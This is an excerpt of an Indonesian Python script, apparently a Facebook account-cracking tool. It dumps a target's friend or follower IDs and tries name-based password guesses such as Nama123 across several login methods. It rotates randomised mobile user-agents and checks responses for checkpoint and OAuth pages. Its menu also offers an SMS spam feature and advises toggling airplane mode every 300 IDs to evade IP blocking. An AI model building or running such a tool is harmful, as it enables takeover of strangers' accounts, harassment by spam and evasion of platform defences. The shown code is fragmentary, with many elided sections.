...
for t in range(10000):
	...
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	brayen1=f'Mozilla/5.0 (Linux; Android {a}; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	brayen2=f'Mozilla/5.0 (Linux; Android {a}; HTC One M9 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36 HeyTapBrowser/40.8.8.9'
	brayen3=f'Mozilla/5.0 (Linux; Android {a}; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	brayen4=f'Mozilla/5.0 (Linux; Android {a}; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
				...
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'Sukses!' in str(response6):
							...
							print("\n ╰─  Login Berhasil | python DB.py");exit()
			except Exception as e:
...
def menu(my_name,my_id):
	...
	cetak(panel(f'[bold white] Thanks To Alvino Adijaya , Rozhak XD , DerrXr , Asepit-Gans, Denz ga di ajak 😁 😁',width=90,style=f"bold white"))
	cetak(panel(f'[bold white][[bold red]•[/][bold white]][/] [bold white]Username : [bold red]{my_name}[/]\n[bold white][[bold red]•[/][bold white]][/] [bold white]User Idz : [bold red]{my_id}[/]\n[bold white][[bold red]•[/][bold white]][/] [bold white]User Ip  : [bold red]{ip}[/][/] ',width=90,title=f"[bold red]Infomasi",style=f"bold white"))
	cetak(panel(f'[bold white][[bold red]01[/][bold white]][/] [bold white]Crack Publick [[bold red] ON [bold white]][/]\n[bold white][[bold red]02[/][bold white]][/] [bold white]Crack Massal [[bold red] ON [bold white]][/]\n[bold white][[bold red]03[/][bold white]][/] [bold white]Cek Result [[bold red] ON [bold white]][/]\n[bold white][[bold red]00[/][bold white]][/] [bold white]Ganti Cookies [[bold red] ON [bold white]][/]',width=90,title=f"[bold red]List Menu",style=f"bold white"))
	cetak(panel(f'[bold white]Ketik [bold red]"Lainnya"[bold white] Untuk Melihat Menu Tambahan | Ketik [bold red]"Bot"[bold white] Untuk Ke Menu Tambahan',width=90,title=f"[bold red]Informasi Crack",style=f"bold white"))
	_____brayennn___xd____ = input(f' \x1b[1;91m╰─  Pilih Menu Crack : ')
	if _____brayennn___xd____ in ['1','01']:
		...
		print(' \x1b[1;91m╰─  Pilih Yang Bener Asu ')
		back()
def error():
	print(f' \x1b[1;91m╰─  Maaf Fitur Ini Masih Di Perbaiki')
	time.sleep(4)
	back() 
...
def bot():
	...
	bray = input(f' \x1b[1;91m╰─  Pilih Menu Crack : ')
	if bray in(''):
		print(' \x1b[1;91m╰─  Pilih Yang Bener Asu ');back()
	if bray in('1','01'):
		file_cp()
	elif bray in('2','02'):
		spam_sms()
...
def pengikut():
	try:
		...
		exit()
	ses = requests.Session()
	cetak(panel(f"Ketik \x1b[1;91mME Jika Ingin Crack Dari Total Followers Anda Sendiri",width=90,padding=(0,7),style=f"bold white"))
	akun = console.input(f' \x1b[1;91m╰─  Masukan Id Target : ')
	try:
...
def brayen_dump():
	try:
		...
		exit()
	cetak(panel('\t            [bold white]Ketik [bold red]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,style='bold white'))
	pil = input(f' \x1b[1;91m╰─  Masukan ID Target : ')
	try:
...
def dump_massal():
	try:
		...
		exit()
	try:
		cetak(panel('\t            [bold white]Ketik [bold red]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,title=f"[bold red]Crack Massal",style=f"bold white"))
		jum = int(input(f' ╰─  {M}Mau Berapa Idz Target {x} : '))
	except ValueError:
		print(' ╰─  Wrong input ')
		exit()
	if jum<1 or jum>80:
...
def setting():
	print('')
	cetak(panel(f'[bold white][[bold red]01[/][bold white]][/] [bold white]Crack Idz Old [[bold red]Not Recommended[bold white]][/]\n[bold white][[bold red]02[/][bold white]][/] [bold white]Crack Idz New [[bold green]Very Recommended[bold white]][/]\n[bold white][[bold red]03[/][bold white]][/] [bold white]Crack Idz Random [[bold green]Very Recommended[bold white]][/]',width=90,title=f"[bold red]Setting Urutan Idz",style=f"bold white"))
	hu = input(f' \x1b[1;91m╰─  Pilih Urutan id : ')
	if hu in ['1','01']:
		...
		exit()
	cetak(panel(f'[bold white][[bold  red]01[/][bold white]][/] [bold white]Metode Mobile V1 [[bold green]Very Recommended[bold white]][/]\n[bold white][[bold red]02[/][bold white]][/] [bold white]Metode Mbasic [[bold green]Recommended[bold white]][/]\n[bold white][[bold red]03[/][bold white]][/] [bold white]Metode Free [[bold green]Recommended[bold white]][/]\n[bold white][[bold red]04[/][bold white]][/] [bold white]Metode Mbeta [[bold red]Not Recommended[bold white]][/]\n[bold white][[bold red]05[/][bold white]][/] [bold white]Metode Async [[bold green]Recommended[bold white]][/]\n[bold white][[bold red]06[/][bold white]][/] [bold white]Metode Reguler [[bold green]Very Recommended[bold white]][/]',width=90,title=f"[bold red]Setting Metode",style=f"bold white"))
	hc = input(f' \x1b[1;91m╰─  Pilih Metode : ')
	if hc in ['1','01']:
		...
		method.append('mobile')
	cetak(panel('''[bold white][[bold red]01[bold white]] [bold white]Nama, Nama123, Nama1234 [[bold green]Recommended[bold white]]
[bold white][[bold red]02[bold white]] [bold white]Nama, Nama123, Nama1234, Nama12345 [[bold green]Very Recommended[bold white]]
[bold white][[bold red]03[bold white]] [bold white]Nama, Nama123, Nama1234, Nama12345 + Manual [[bold red]Not Recommended[bold white]]''',style='bold white',title='[bold red]Setting Password',width=90))
	pwplus=input(f' ╰─  {M}Pilih sandi : ')
	if pwplus in ['03','3']:
		pwpluss.append('ya')
		pwku=input(f' ╰─  {M}Sandi : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
	...
	cetak(panel(f'[bold white]Apakah Anda Ingin Mengunakan User-Agent Manual Untuk Melakukan Crack Account ? Y/T',width=90,title=f"[bold red]Setting User-Agent",style=f"bold white"))
	uatambah = input(f' \x1b[1;91m╰─  Pilih : ')
	if uatambah in ['y','Ya','ya','Y']:
		ualuh.append('ya')
		bzer = input(f' \x1b[1;91m╰─  Masukan User-Agent : ')
		ualu.append(bzer)
	else:
		ualuh.append('tidak')
	passwrd()
...
def passwrd():
	...
	cetak(panel(f'\t[bold white]On/Off Mode Pesawat Setiap 300 Idz Agar Terhindar Dari Spam Ip',width=90,title=f"[bold red]Informasi",subtitle=f"[bold red]Proses Crack",style=f"bold white"))
